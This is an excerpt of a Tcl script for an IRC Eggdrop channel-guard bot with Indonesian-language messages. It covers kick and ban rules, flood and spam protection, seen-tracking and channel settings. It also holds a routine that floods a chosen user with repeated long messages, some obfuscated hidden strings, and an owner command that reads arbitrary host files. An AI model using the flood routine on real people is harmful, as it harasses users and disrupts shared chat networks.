putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4DurjanA1..! [banmsg]"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb 4DurjanA.GuaRd $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
...
puthelp "NOTICE $channel :yang sabar ya!!! satu menit chanel di moderet ada flooder..!"
}
...
if {$quick == "1"} {
putquick "mode $channel +i+R"
} {
putserv "mode $channel +i+R"
}
set is_m($channel) 1
return 0
}
...
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*irc.big.net.id*" $nick] && ![string match "*Guest*" $botnick]} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != [decrypt 64 "1sTFC1W.UYI/"]} {
...
if {$opnick == $ps} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] 1DonT De@p ! [banmsg]"
}
opq $channel $opnick
return 0
}
...
if {$opnick == $notb} {
if {![info exists igflood($nick)]} {
putserv "KICK $channel $nick :[lgrnd] 1DonT De@p 4DurjanA1..! [banmsg]"
}
opq $channel $opnick
return 0
}
...
set usrv [dezip "n7HxX.QG0Px08me8q/KR/cf1UghyO0YsjHj.HH/.q1mMkh50"]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
return 0
}
...
set realname [dezip "rKnRU1dkKvE0h.HSX1PxRPr/gz2.y1Eo3Un.rFmCW.jTjfa/QDq1a1Mnz6C0K7aLh1S5z/r1"]
}
...
if {$badwords == ""} {
set badwords "tahe tele kodo hutu hvtv botulote tele k0d0 huangang polom apula anjing babi tapuhule hule tel3 kod0 injang sele luji huakak wakako injank bakalae sparing"
setuser "config" XTRA "BADWORDS" $badwords
}
...
"Carla?*" "Carmen?*" "Sex?*" "Hule?*" "Angin-?*" "Awan-?*" "A-N-G-I-N?*" "Bridget?*" "Briana?*" "Bella?*" "Becky?*" "Barbra?*"
"Aldora?*" "Alysia?*" "altesse?*" "Amorita?*" "tele?*" "Ara?*" "April?*" "Apollo?*" "Anita?*"  "a7la?*"
}
...
if {$tjidx == 1} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$tjidx == 2} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 DRonE TRoJaN [banmsg]"
} elseif {$tjidx == 3} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$tjidx == 4} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 Ups WRoNg WaY [banmsg]"
} elseif {$tjidx == 5} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 DonT EnTeReD 4[string toupper $chan] [banms]"
} elseif {$tjidx == 6} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 InTeRcEpT [banmsg]"
} elseif {$tjidx == 7} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 G.o.T.c.H.a [banmsg]"
} elseif {$tjidx == 8} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 NEgaTIvE HoUsToN [banmsg]"
} elseif {$tjidx == 9} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 gRoUndEd [banmsg]"
} elseif {$tjidx == 10} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 AnTIcIpaTEd [banmsg]"
} elseif {$tjidx == 11} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$tjidx == 12} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$tjidx == 13} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$tjidx == 14} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 sMoosHINg ReLaY TaBLe [banmsg]"
} elseif {$tjidx == 15} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$tjidx == 16} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$tjidx == 17} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 FakE NIcKNaMe [banmsg]"
} elseif {$tjidx >= 18} {
putserv "KICK $chan $nick :$notc !4Trτjβ4N!10 Unable to resolve4 $nick [banms]"
set tjidx 0
}
incr tjidx
return 0
...
puthlp "NOTICE $nick :$notc Usage +noidle <menit>"
return 0
}
if {$rest == 0} {
...
puthelp "NOTICE $nick :$notc idle nick deop $chan $rest menit"
saveuser
}
proc pub_-noidle {nick uhost hand chan rest} {
global notc
...
puthelp "NOTICE $nick :$notc Away Nick deop $chan \[9Aktif\]"
saveuser
}
proc pub_-noaway {nick uhost hand chan rest} {
global notc
...
puthelp "NOTICE $nick :$notc Away Nick deop $chan \[4MaTi\]"
saveuser
}
...
global botnick vern notc version server
puthlp "NOTICE $nick :\001VERSION $notc $vern 1Get It Now! visit: 12http://durjana.do.am/\001"
return 0
}
proc uncolor {s} {
regsub -all --  $s "" s
...
if {[onchan $data $chan]} {
puthlp "$target :[lgrnd] $nick, $data Ada Ol Skarang Tantu Bo Buta Ngana eNe..!"
return $bs(logqueries)
}
...
return [concat $nick, $data was last seen on $chan [bs_when [lindex $seen 0]] yang lalu]
}
}
}
...
set output [concat $n ($addy) part dari chan $chan [bs_when $time] pesan part$reason]
}
quit {
set reason [lrange $data 5 e]
if {$reason == "Quit: {{}}"} {set reason "."} {set reason " stating $reason."}
set output [concat $n ($addy) quit dari chan $chan [bs_when $time] dengan pesan Quit$reason]
}
kick {
set output [concat $n ($addy) di kick dari chan $chan oleh [lindex $data 5] [bs_when $time] dengan pesan ([join [lrange $data 6 e]]).]
}
rnck {
set output [concat $n ($addy) mengganti nick dari [lindex $data 5] on [lindex $data 4] [bs_when $time] yang lalu]
...
nick {
set output [concat $n ($addy) baganti nick jadi [lindex $data 5] ada di [lindex $data 4] [bs_when $time] yang lalu]
}
splt {
set output [concat $n ($addy) parting $chan due to a split [bs_when $time] yang lalu]
}
rejn {
set output [concat $n ($addy) rejoining $chan from a split [bs_when $time] yang lalu]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
...
join {
set output [concat $n ($addy) joining $chan [bs_when $time] yang lalu]
if {[validchan $chan]} {
if {[onchan $n $chan]} {
set output [concat $output  $n is still on $chan.]
} {
...
set reason [lrange $data 5 e]
if {$reason == ""} {
set output [concat $n ($addy) returning to the partyline on $chan [bs_when $time] yang lalu]
} {
set output [concat $n ($addy) seen being marked as away ($reason) on $chan [bs_when $time] yang lalu]
}
}
chon {
set output [concat $n ($addy) joining the partyline [bs_when $time] yang lalu]
...
if {$time < 60} {return "waktu $time detik"}
if {$time >= 31536000} {
set tahun [expr int([expr $time/31536000])]
set time [expr $time - [expr 31536000*$tahun]]
}
if {$time >= 86400} {
set hari [expr int([expr $time/86400])]
set time [expr $time - [expr 86400*$hari]]
}
if {$time >= 3600} {
set jam [expr int([expr $time/3600])]
set time [expr $time - [expr 3600*$jam]]
}
if {$time >= 60} {
set menit [expr int([expr $time/60])]
}
if {$tahun == 0} {
set output ""
} elseif {$tahun == 1} {
...
set output "$tahun tahun,"
}
if {$hari == 1} {lappend output "1 hari,"} elseif {$hari > 1} {lappend output "$hari hari,"}
if {$jam == 1} {lappend output "1 jam,"} elseif {$jam > 1} {lappend output "$jam jam,"}
if {$menit == 1} {lappend output "1 menit"} elseif {$menit > 1} {lappend output "$menit menit"}
...
if {$resume == "F"} { return 0 }
putsrv "KICK $chan $nick :$notc 1Jangan 4SLaPS1 Qt Pe BosS!! [banmsg]"
return 0
}
if {[matchattr [lindex $text 1] f]} {
if {$resume == "F"} { return 0 }
putsrv "KICK $chan $nick :$notc 1Jangan 4SLaPS1 Qt Pe FrieNd!! [banmsg]"
return 0
}
if {[matchattr [lindex $text 1] m]} {
if {$resume == "F"} { return 0 }
putsrv "KICK $chan $nick :$notc 1JangAn 4SLaPS1 Qt Pe MaSTER!! [banmsg]"
}
return 0
}
...
if {[string match "*http://*" [string tolower $text]] || [string match "*.join*.*" [string tolower $text]]} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 8Jangan Ba 4Iklan di sini1 IN 4[string toupper $chan] [banms]"
return 0
}
...
set bannick($nick) "*!*$mhost"
putsrv "KICK $chan $nick :$notc 4Jangan Ba 9RePeAt waaa 4$mhost 13 batas4 [getuser $cflag XTRA "RPT"] kali waaa [banms]"
...
putsrv "KICK $chan $nick :$notc 13 jangan talalu 4panjang olo ko'u 2MaX4 [getuser $cflag XTRA "CHAR"]13 CHaRakter [banmsg]"
} {
putsrv "KICK $chan $nick :$notc 13 jangan talalu 4panjang olo ko'u 2MaX4 [getuser $cflag XTRA "CHAR"]13 CHaRaKteR [banmsg]"
}
return 0
...
putsrv "KICK $chan $nick :$notc 13Jangan 4pake hurup basar olo waa 9 :(4 [getuser $cflag XTRA "CAPS"]%1..! [banmsg]"
set capsnick($nick) "1"
return 0
}
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
...
putsrv "KICK $chan $nick :$notc 13 jangan 4PaKe Warna waa 4..! [banmsg]"
...
if {$type == "join"} {
set bannick($nick) "*!*$mhost"
putsrv "KICK $channel $nick :$notc 13Wuih 4JoIN1 FRoM 4$mhost [banms]"
}
if {$type == "ctcp"} {
if {![info exists kops]} {
...
putsrv "KICK $channel $nick :$notc 13Jangan Kuat Ba ganti nick4..! [banmsg]"
} {
...
puthlp "NOTICE $who :$notc 4DiToLaK!10"
return 0
} else {
set joinme $who
}
...
putsrv "KICK $x $who :$notc !4Spβ4M!10 I HaTE 4InvITeR [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
...
set sendspam "!kick [zip "$x $who $notc !4Spβ4M!10 FRoM 4[string range $nick [string first "@" $nick] end]1 InvITE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
if {[isop $botnick $x]} {
putsrv "KICK $x $nick :$notc !4Spβ4M!10 I HaTE 4VIRuZ [banms]"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
...
set sendspam "!kick [zip "$x $nick $notc !4Spβ4M!10 YeW GoT VIRuZ JoIN #NOHACK TO FIxED [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
putdcc $idx "4DiToLaK!10, [lindex $arg 0] <n/a>"
return 0
}
if {[lindex $arg 1] != ""} {
...
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :$notc 4DiToLaK!10"
return 0
}
if {![file exists $arg]} {
puthlp "PRIVMSG $nick :4DiToLaK!10, $arg <n/a>"
return 0
}
...
if {![file exists $file]} {
puthlp "NOTICE 4DiToLaK!10, not found terobot.tcl"
return 0
}
...
putsrv "KICK $x $nick :$notc !4Spβ4M!10 InvITE aWaY MSg [banmsg]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x] && [string tolower $c] != [string tolower $ps]} {
set sendspam "!kick [zip "$x $nick $notc !4Spβ4M!10 FRoM 4[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]1 InvITE aWaY MSg [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
if {$nick != $own} { return 0 }
if {![matchattr $nick Q]} {
puthlp "PRIVMSG $nick :4DiToLaK!10"
return 0
}
if {$arg == ""} {
set arg "."
...
if {$hand != $own} { return 0 }
if {![file exists $arg]} {
putdcc $idx "4DiToLaK!10, FiLE NoT ExIST $arg"
return 0
}
set fd [open $arg r]
putdcc $idx "4******************** START ***********************"
...
if {![isnumber $mtime]} {
puthlp "NOTICE $nick :$notc Usage: bantime <menit> (set 0 to never unban)"
return 0
}
set ban-time $mtime
...
puthlp "NOTICE $nick :$notc LOGCHAN [getuser "config" XTRA "LOGCHAN"] \[4MaTi\]"
setuser "config" XTRA "LOGCHAN" ""
} else {
if {[string tolower $rest] == [decrypt 64 "1sTFC1W.UYI/"]} {
return 0
}
if {![validchan $rest]} {
...
puthlp "NOTICE $nick :$notc LOG CHaNNEL $rest \[9Aktif\]"
}
saveuser
utimer 5 rehashing
}
...
putdcc $idx "4DiToLaK!10, Log file haven't create yet!"
return 0
}
...
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $channel]} {
putsrv "KICK $channel $x :$notc !4Spβ4M!10 FRoM 4$mhost 1$invme($mhost) 4R1emote 4O1ff4..! [banmsg]"
}
} {
putsrv "KICK $channel $x :$notc !4Spβ4M!10 FRoM 4$mhost 1$invme($mhost) [banmsg]"
}
}
catch {unset invme($mhost)}
}
...
if {![isop $x $channel]} {
set bannick($x) "*!*$mhost"
putsrv "KICK $channel $x :$notc !4Spβ4M!10 FRoM 4$mhost1 VIRuZ [banmsg]"
set virus_nick ""
}
}
...
set bannick($nick) "*!*$mhost"
if {$spidx == 1} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$spidx == 2} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 DRonE TRoJaN [banmsg]"
} elseif {$spidx == 3} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$spidx == 4} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 Ups WRoNg WaY [banmsg]"
} elseif {$spidx == 5} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 DonT EnTeReD 4[string toupper $chan] [banms]"
} elseif {$spidx == 6} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 InTeRcEpT [banmsg]"
} elseif {$spidx == 7} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 G.o.T.c.H.a [banmsg]"
} elseif {$spidx == 8} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 NEgaTIvE HoUsToN [banmsg]"
} elseif {$spidx == 9} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 gRoUndEd [banmsg]"
} elseif {$spidx == 10} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 AnTIcIpaTEd [banmsg]"
} elseif {$spidx == 11} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$spidx == 12} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$spidx == 13} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$spidx == 14} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 sMoosHINg ReLaY TaBLe [banmsg]"
} elseif {$spidx == 15} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$spidx == 16} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$spidx == 17} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 FakE NIcKNaMe [banmsg]"
} elseif {$spidx >= 18} {
putsrv "KICK $chan $nick :$notc !4Spβ4M!10 Unable to resolve4 $nick [banms]"
set spidx 0
}
incr spidx
return 0
...
if {$nick==$botnick} {return 0}
#set asu "#$notb"
#if {[string tolower $asu] != "#H"} {return 0}
...
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 flood kasana 14,1\[0 $bos 14\]2,0 4BOt dia jaga ddos !!! [lgrnd]"
puthlp "PRIVMSG $owner :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 flood kasana 14,1\[0 $bos 14\]2,0 4BOt dia jaga ddos !!! [lgrnd]"
return 0
...
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 dia jaga kill Bot. 4HanCuRkAN !!! [lgrnd]"
puthlp "PRIVMSG $owner :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 is dia jaga kill Bot. 4HanCuRkAN !!! [lgrnd]"
return 0
} else {
if {[onchan $nick $x] && [botisop $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
...
set tukang "${nick}!*@*"
newignore $tukang $botnick "*" 60
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 Dia Jaga haCker ini bot. 4Sekaaaaaaaa !!! [lgrnd]"
puthlp "PRIVMSG $basechan :10,1\[11INFO!!10\]2,0 uSeR 14,1\[0 $nick 14\]2,0 Dia Jaga haCker ini bot. 4Sekaaaaaaaa !!! [lgrnd]"
return 0
}
}
...
if {[info exists pingchan($nick)]} {
puthlp "PRIVMSG $pingchan($nick) :Deteksi lag dari $nick adalah: $pingtime detik"
unset pingchan($nick)
}
if {![matchattr $nick f]} {
set tukang "${nick}!*@*"
putlog "!Log! 1 menit auto ignore to $tukang"
...
append mstatus "\[12G\]uaRd FLoOd \[12LInE4 $ichan12 cTcP4 $ictcp12 JoIN4 $ijoin12 KIcK4 $ikick12 De@p4 $ideop12 NIcK4 $inick\] "
if {${ban-time} != 0} { append globals "\[12B\]aNTImE4 ${ban-time}12 mIn " }
}
if {[matchattr $cflag V]} { append mstatus "\[12A\]uToVoIcE4 [getuser $cflag XTRA "VC"]12 Sec's " }
...
if {[matchattr $cflag H]} { append mstatus "\[12N\]TcParT " }
if {[matchattr $cflag S]} { append mstatus "\[12S\]paM " }
if {[getuser "config" XTRA "KOPS"]!=""} { append globals "\[12@\]PSKIcK " }
if {[getuser "config" XTRA "KCOUNTER"]=="ON"} { append globals "\[7K\]IcKCouNTeR " }
if {[matchattr $cflag R]} { append mstatus "\[12R\]ePeaT4 [getuser $cflag XTRA "RPT"] " }
if {[matchattr $cflag U]} { append mstatus "\[12C\]aPs4 [getuser $cflag XTRA "CAPS"]% " }
if {[matchattr $cflag P]} { append mstatus "JoIN\[12P\]aRT4 [getuser $cflag XTRA "JP"]12 Sec's " }
if {[matchattr $cflag T]} { append mstatus "\[12T\]exT4 [getuser $cflag XTRA "CHAR"]12 CHaR " }
if {[matchattr $cflag J]} { append mstatus "MaSs\[12J\]oIN " }
if {[matchattr $cflag L]} { append mstatus "\[12L\]ImITEd4 +[getuser $cflag XTRA "LIMIT"] " }
if {[string match "*+seen*" $cinfo]} { append mstatus "\[12S\]EEN " }
if {[matchattr $cflag O]} { append mstatus "\[12C\]LonE4 [getuser $cflag XTRA "CLONE"]12 MaX " }
if {[matchattr $cflag B]} { append mstatus "\[12B\]OLd " }
if {[matchattr $cflag W]} { append mstatus "Co\[12L\]OuR " }
if {[string match "*+action*" $cinfo]} { append mstatus "\[12AC\]Tion " }
if {[string match "*+guest*" $cinfo]} { append mstatus "\[12No\]GUesT " }
if {[string match "*+trojan*" $cinfo]} { append mstatus "\[12No\]TrojaN " }
if {[string match "*+resync*" $cinfo]} { append mstatus "\[12A\]utoResync " }
if {[string match "*+noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 9ON12 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's12 unident: 9ON\) " }
if {[string match "*+noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 9ON2 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's12 unident: 4OFF\) " }
if {[string match "*+noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 9ON12 idle: 4OFF12 unident: 9ON\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 4OFF12 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's12 unident: 9ON\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*+unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 4OFF12 idle: 4OFF12 unident: 9ON\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 4OFF2 idle: 4OFF12 unident: 4OFF\) " }
if {[string match "*-noaway*" $cinfo] && [string match "*+noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 4OFF12 idle:4 [getuser $cflag XTRA "NOIDLE"] 9Min's12 unident: 4OFF\) " }
if {[string match "*+noaway*" $cinfo] && [string match "*-noidle*" $cinfo] && [string match "*-unident*" $cinfo]} { append mstatus "De\[12@\]ps\(12away: 9ON12 idle: 4OFF2 unident: 4OFF\) " }
if {[matchattr $cflag E]} { append mstatus "\[12E\]nFoRceBaN " }
if {[matchattr $cflag C]} { append mstatus "\[12C\]YcLE4 [getuser $cflag XTRA "CYCLE"]12 Min's " }
if {$mstatus != ""} {
...
puthlp "NOTICE $nick :$notc ALL SpaM CHaNNeL \[9Aktif\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[matchattr $cflag S]} {
puthlp "NOTICE $nick :$notc SpaM $chan \[9Aktif\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
puthlp "NOTICE $nick :$notc ALL SpaM CHaNNeL \[4MaTi\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {![matchattr $cflag S]} {
puthlp "NOTICE $nick :$notc SpaM $chan \[4MaTi\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DiToLaK!10"
...
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +cYcLe <menit>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
...
puthlp "NOTICE $nick :$notc cYcLe $chan \[4MaTi\]"
saveuser
foreach x [timers] {
...
puthlp "NOTICE $nick :$notc AuTOGReeT $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc NotiCe PaRt $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc LImIT $chan \[4MaTi\]"
...
set cflag [string range $cflag 0 8]
if {$rest=="" || ![isnumber $rest]} {
puthlp "NOTICE $nick :$notc Usage +joinpart <detik>"
return 0
}
if {$rest == 0} {
puthlp "NOTICE $nick :$notc cAnT UsE NuLL"
...
puthlp "NOTICE $nick :$notc JoINPaRT $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc cLonE $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc KeY $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc TexT $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc cAPs $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc RePeaT $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc AuTovoIcE $chan \[4MaTi\]"
saveuser
foreach x [utimers] {
...
chattr $cflag +E
puthlp "NOTICE $nick :$notc enforceban $chan \[9Aktif\]"
saveuser
}
proc pub_-enforceban {nick uhost hand chan rest} {
global notc
...
chattr $cflag -E
puthlp "NOTICE $nick :$notc enforceban $chan \[4MaTi\]"
saveuser
}
...
chattr $cflag +D
puthlp "NOTICE $nick :$notc revenge $chan \[9Aktif\]"
saveuser
}
proc pub_-revenge {nick uhost hand chan rest} {
global notc
...
chattr $cflag -D
puthlp "NOTICE $nick :$notc revenge $chan \[4MaTi\]"
saveuser
}
...
chattr $cflag +M
puthlp "NOTICE $nick :$notc forced $chan \[9Aktif\]"
saveuser
}
proc pub_-forced {nick uhost hand chan rest} {
global notc
...
set cflag [string range $cflag 0 8]
chattr $cflag -M
puthlp "NOTICE $nick :$notc forced $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc colour kick \[4MaTi\]"
saveuser
}
proc pub_+colour {nick uhost hand chan rest} {
global notc kickclr
...
puthlp "NOTICE $nick :$notc colour kick \[9Aktif\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc colours kick $chan \[9Aktif\]"
saveuser
}
proc pub_-colours {nick uhost hand chan rest} {
global notc
...
chattr $cflag -W
puthlp "NOTICE $nick :$notc colours kick $chan \[4MaTi\]"
saveuser
}
...
puthlp "NOTICE $nick :$notc BOLD kick $chan \[9Aktif\]"
saveuser
}
proc pub_-bold {nick uhost hand chan rest} {
global notc
...
chattr $cflag -B
puthlp "NOTICE $nick :$notc bOLd kick $chan \[4MaTi\]"
saveuser
}
...
if {[string match "*+action*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc $chan 4Siap BosS!!"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc AcTion Random \[9Aktif\]"
} {
setuser $cflag XTRA "ACTION" $rest
puthlp "NOTICE $nick :$notc AcTion SeT TO \[$rest\]"
}
catch { channel set $chan +action }
puthlp "NOTICE $nick :$notc AcTion $chan \[9Aktif\]"
saveuser
}
proc pub_-action {nick uhost hand chan rest} {
global notc
...
puthlp "NOTICE $nick :$notc AcTion $chan \[4MaTi\]"
saveuser
}
setudef flag guest
...
puthlp "NOTICE $nick :$notc Guest Nick Kick (@) & Report $chan \[9Aktif\]"
saveuser
}
proc pub_-guest {nick uhost hand chan rest} {
global notc
...
puthlp "NOTICE $nick :$notc Guest Nick Kick (@) & Report $chan \[4MaTi\]"
saveuser
}
setudef flag trojan
...
puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan \[9Aktif\]"
saveuser
}
proc pub_-trojan {nick uhost hand chan rest} {
global notc
...
puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan \[4MaTi\]"
saveuser
}
##########################################################################
# [flood.tcl]                                                            #
...
if {$rest!=""} {
puthelp "NOTICE $person :$rest, Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "PRIVMSG $person :$rest, Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
puthelp "NOTICE $person :$rest, Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH Mω[rand 15]βηH"
